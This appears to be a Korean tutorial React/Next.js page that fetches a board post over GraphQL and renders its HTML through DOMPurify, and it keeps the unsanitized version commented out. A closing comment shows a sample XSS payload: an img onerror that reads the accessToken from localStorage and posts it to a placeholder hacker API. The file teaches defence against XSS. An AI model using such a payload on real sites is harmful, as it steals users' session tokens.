import { useQuery, gql } from "@apollo/client";
import DOMPurify from "dompurify";
import { useRouter } from "next/router";
import React from "react";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      writer
      title
      contents
    }
  }
`;
export default function StaticRoutePage() {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.id },
  });

  return (
    <>
      {/* <div>{router.query.number}번 게시글로 이동이 완료되었습니다.</div> */}
      <div>작성자 : {data ? data.fetchBoard.writer : "로딩중입니다.."}</div>
      <div>제목 : {data?.fetchBoard.title}</div>
      {/* <div>내용 : {data?.fetchBoard.contents}</div> */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: data?.fetchBoard.contents,
        }}
      ></div> */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(String(data?.fetchBoard.contents)),
          }}
        />
      )}
    </>
  );
}

// playground XSS 공격
// <img src="#" onerror="
// 	const aaa = localStorage.getItem('accessToken');
// 	axios.post(해커API주소, {accessToken = aaa});
// " />
